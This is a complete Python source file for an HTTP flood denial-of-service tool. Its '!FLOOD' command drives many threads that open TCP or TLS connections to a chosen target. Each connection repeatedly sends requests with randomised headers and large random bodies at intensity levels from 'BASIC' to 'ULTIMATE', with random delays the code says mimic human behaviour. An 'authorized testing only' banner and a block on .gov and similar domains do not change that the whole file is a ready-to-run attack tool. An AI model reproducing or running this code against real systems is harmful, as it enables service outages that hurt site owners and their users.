import socket
import threading
import string
import random
import time
import os
import platform
import sys
import select
import ssl
import logging
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
try:
    from colorama import Fore, init
    init(autoreset=True)
except ModuleNotFoundError as e:
    print(f"Error: {e}. Please install colorama using 'pip install colorama'")
    exit()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

stop_attack = threading.Event()
success_count = 0
total_bytes_sent = 0
ssl_failures = 0

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random URL path
def generate_url_path():
    endpoints = [
        f"page/{random.randint(1, 1000)}",
        f"api/data/{random.choice(['user', 'product', 'cart'])}",
        f"search?q={generate_random_string(10)}",
        f"assets/{generate_random_string(8)}.js",
    ]
    return random.choice(endpoints)

# Generate random string
def generate_random_string(length):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# Generate large payload
def generate_large_payload(size=1024):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

# Header lists for randomization
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]
accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json,text/plain,*/*",
    "*/*",
]
accept_languages = ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"]
accept_encodings = ["gzip, deflate, br", "gzip, deflate", "br"]
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    f"https://{random.choice(['example.com', 'test.com', 'dummy.com'])}/",
]
content_types = ["application/x-www-form-urlencoded", "multipart/form-data", "application/json"]
cookies = [f"session={generate_random_string(16)}", f"token={generate_random_string(32)}"]

# Attack logic
def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False):
    global success_count, total_bytes_sent, ssl_failures
    if stop_attack.is_set():
        return
    url_path = generate_url_path()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20)  # 20s timeout for stable HTTPS
    if use_ssl:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384')
        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or higher
        s = context.wrap_socket(s, server_hostname=host)
    try:
        payload_patterns = {
            'BASIC': (
                f"{type_attack} /{url_path} HTTP/1.1\n"
                f"Host: {host}\n"
                f"Connection: keep-alive\n"
                f"User-Agent: {random.choice(user_agents)}\n"
                f"Accept: {random.choice(accepts)}\n"
                f"Accept-Language: {random.choice(accept_languages)}\n"
                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                f"Referer: {random.choice(referers)}\n"
                f"Cookie: {random.choice(cookies)}\n"
                f"DNT: 1\n"
                f"Upgrade-Insecure-Requests: 1\n"
                f"Content-Type: {random.choice(content_types)}\n"
                f"Content-Length: 1024\n\n"
                f"{generate_large_payload(1024)}"
            ),
            'MEDIUM': (
                f"{type_attack} /{url_path} HTTP/1.1\n"
                f"Host: {host}\n"
                f"Connection: keep-alive\n"
                f"User-Agent: {random.choice(user_agents)}\n"
                f"Accept: {random.choice(accepts)}\n"
                f"Accept-Language: {random.choice(accept_languages)}\n"
                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                f"Referer: {random.choice(referers)}\n"
                f"Cookie: {random.choice(cookies)}\n"
                f"DNT: 1\n"
                f"Upgrade-Insecure-Requests: 1\n"
                f"Content-Type: {random.choice(content_types)}\n"
                f"Content-Length: 8192\n\n"
                f"{generate_large_payload(8192)}"
            ),
            'INSANE': (
                f"{type_attack} /{url_path} HTTP/1.1\n"
                f"Host: {host}\n"
                f"Connection: keep-alive\n"
                f"User-Agent: {random.choice(user_agents)}\n"
                f"Accept: {random.choice(accepts)}\n"
                f"Accept-Language: {random.choice(accept_languages)}\n"
                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                f"Referer: {random.choice(referers)}\n"
                f"Cookie: {random.choice(cookies)}\n"
                f"DNT: 1\n"
                f"Upgrade-Insecure-Requests: 1\n"
                f"Content-Type: {random.choice(content_types)}\n"
                f"Content-Length: 32768\n\n"
                f"{generate_large_payload(32768)}"
            ),
            'EXTREME': (
                f"{type_attack} /{url_path} HTTP/1.1\n"
                f"Host: {host}\n"
                f"Connection: keep-alive\n"
                f"User-Agent: {random.choice(user_agents)}\n"
                f"Accept: {random.choice(accepts)}\n"
                f"Accept-Language: {random.choice(accept_languages)}\n"
                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                f"Referer: {random.choice(referers)}\n"
                f"Cookie: {random.choice(cookies)}\n"
                f"DNT: 1\n"
                f"Upgrade-Insecure-Requests: 1\n"
                f"Content-Type: {random.choice(content_types)}\n"
                f"Content-Length: 65536\n\n"
                f"{generate_large_payload(65536)}"
            ),
            'ULTIMATE': (
                f"{type_attack} /{url_path} HTTP/1.1\n"
                f"Host: {host}\n"
                f"Connection: keep-alive\n"
                f"User-Agent: {random.choice(user_agents)}\n"
                f"Accept: {random.choice(accepts)}\n"
                f"Accept-Language: {random.choice(accept_languages)}\n"
                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                f"Referer: {random.choice(referers)}\n"
                f"Cookie: {random.choice(cookies)}\n"
                f"DNT: 1\n"
                f"Upgrade-Insecure-Requests: 1\n"
                f"Content-Type: {random.choice(content_types)}\n"
                f"Content-Length: 131072\n\n"
                f"{generate_large_payload(131072)}"
            ),
        }
        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
        s.connect((ip, port))
        sent_bytes = 0
        for _ in range(booster_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            sent_bytes += len(packet_data)
            time.sleep(random.uniform(0.05, 0.5))  # Random delay to mimic human behavior
        success_count += 1
        total_bytes_sent += sent_bytes
        logging.info(f"Successful connection: Sent {sent_bytes / 1024:.2f} KB to {ip}:{port}")
    except ssl.SSLEOFError as e:
        ssl_failures += 1
        logging.error(f"SSL EOF error on {ip}:{port}: {str(e)}")
    except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
        logging.error(f"Attack error on {ip}:{port}: {type(e).__name__} - {str(e)}")
    finally:
        s.close()

# Running attack with ThreadPoolExecutor
def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl):
    with ThreadPoolExecutor(max_workers=min(spam_loader, 30)) as executor:
        while time.time() < time_loader and not stop_attack.is_set():
            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
            for future in futures:
                future.result()

# Countdown + interrupt
def countdown_timer(time_loader):
    global total_bytes_sent, ssl_failures
    start_time = time.time()
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        elapsed = time.time() - start_time
        traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
        sys.stdout.write(f"\r{Fore.YELLOW}Time: {remaining}s | Connections: {success_count} | SSL Failures: {ssl_failures} | Traffic: {traffic_kbps:.2f} KB/s{Fore.RESET}")
        sys.stdout.flush()
        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Attack stopped by user{Fore.RESET}")
            return
        time.sleep(1)
        remaining = int(time_loader - time.time())
    if not stop_attack.is_set():
        traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
        print(f"\n{Fore.GREEN}Attack completed | Connections: {success_count} | SSL Failures: {ssl_failures} | Total: {total_bytes_sent / 1024 / 1024:.2f} MB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
        stop_attack.set()

# Exit confirmation
def confirm_exit():
    while True:
        choice = input(f"{Fore.YELLOW}Exit program? (y/n): {Fore.RESET}").lower()
        if choice == 'y':
            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

# Validate URL and extract host, protocol
def validate_target(target):
    try:
        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
        host = parsed.hostname
        if not host:
            raise ValueError("Invalid URL")
        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
            raise ValueError("Attacking .gov, .mil, .edu, or .ac domains is prohibited")
        ip = socket.gethostbyname(host)
        return ip, host, parsed.scheme == 'https'
    except (ValueError, socket.gaierror) as e:
        logging.error(f"Target validation error: {e}")
        return None, None, None

# Main command loop
def command():
    global stop_attack, success_count, total_bytes_sent, ssl_failures
    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                confirm_exit()
                continue

            args_get = data_input_loader.split()
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 10:
                    data_type_loader_packet = args_get[1].upper()
                    if data_type_loader_packet not in ['BASIC', 'MEDIUM', 'INSANE', 'EXTREME', 'ULTIMATE']:
                        print(f"{Fore.RED}TYPE_PACKET must be BASIC, MEDIUM, INSANE, EXTREME, or ULTIMATE{Fore.RESET}")
                        continue
                    target_loader = args_get[2]
                    try:
                        port_loader = int(args_get[3])
                        if not 1 <= port_loader <= 65535:
                            raise ValueError
                    except ValueError:
                        print(f"{Fore.RED}Port must be a number between 1-65535{Fore.RESET}")
                        continue
                    try:
                        time_loader = time.time() + int(args_get[4])
                    except ValueError:
                        print(f"{Fore.RED}TIME must be a number{Fore.RESET}")
                        continue
                    try:
                        spam_loader = int(args_get[5])
                        if spam_loader > 3000:
                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 3000 may overload your system. Proceed with caution.{Fore.RESET}")
                    except ValueError:
                        print(f"{Fore.RED}SPAM_THREAD must be a number{Fore.RESET}")
                        continue
                    try:
                        create_thread = int(args_get[6])
                        if create_thread > 3000:
                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 3000 may overload your system. Proceed with caution.{Fore.RESET}")
                    except ValueError:
                        print(f"{Fore.RED}CREATE_THREAD must be a number{Fore.RESET}")
                        continue
                    try:
                        booster_sent = int(args_get[7])
                    except ValueError:
                        print(f"{Fore.RED}BOOTER_SENT must be a number{Fore.RESET}")
                        continue
                    methods_loader = args_get[8]
                    try:
                        spam_create_thread = int(args_get[9])
                        if spam_create_thread > 3000:
                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 3000 may overload your system. Proceed with caution.{Fore.RESET}")
                    except ValueError:
                        print(f"{Fore.RED}SPAM_CREATE must be a number{Fore.RESET}")
                        continue

                    ip, host, use_ssl = validate_target(target_loader)
                    if not ip:
                        print(f"{Fore.YELLOW}Invalid target or unable to resolve URL{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    success_count = 0
                    total_bytes_sent = 0
                    ssl_failures = 0
                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}{Fore.RESET}")

                    for _ in range(create_thread):
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl)).start()

                    countdown_timer(time_loader)
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Command not found{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
